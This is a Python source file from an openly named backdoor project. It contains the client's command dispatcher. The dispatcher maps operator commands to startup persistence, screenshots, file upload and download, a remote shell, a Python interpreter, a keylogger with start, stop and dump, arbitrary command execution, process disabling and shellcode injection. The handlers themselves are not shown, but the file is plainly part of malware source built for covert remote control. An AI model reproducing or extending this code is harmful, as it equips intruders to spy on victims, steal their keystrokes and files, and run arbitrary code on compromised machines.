"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import src.definitions.commands as c


class CommandHandler:

    def __init__(self, control):
        self.control = control

    def parse(self, command):

        _command = command["key"]

        match _command:
            case c.CLIENT_EXIT:
                self.control.close()
            case c.CLIENT_ADD_STARTUP:
                self.control.add_startup()
            case c.CLIENT_RMV_STARTUP:
                self.control.add_startup(True)
            case c.CLIENT_SCREENSHOT:
                self.control.screenshot()
            case c.CLIENT_UPLOAD_FILE:
                self.control.upload(command["value"]["buffer"], command["value"]["value"])
            case c.CLIENT_RECV_FILE:
                self.control.receive(command["value"])
            case c.CLIENT_LOCK:
                self.control.lock()
            case c.CLIENT_HEARTBEAT:
                pass
            case c.CLIENT_SHELL:
                self.control.command_shell()
            case c.CLIENT_PYTHON_INTERPRETER:
                self.control.python_interpreter()
            case c.CLIENT_KEYLOG_START:
                self.control.keylogger_start()
            case c.CLIENT_KEYLOG_STOP:
                self.control.keylogger_stop()
            case c.CLIENT_KEYLOG_DUMP:
                self.control.keylogger_dump()
            case c.CLIENT_RUN_CMD:
                self.control.run_command(command["value"])
            case c.CLIENT_DISABLE_PROCESS:
                self.control.toggle_disable_process(command["value"]["process"], command["value"]["popup"])
            case c.CLIENT_SHELLCODE:
                self.control.inject_shellcode(command["value"]["buffer"])
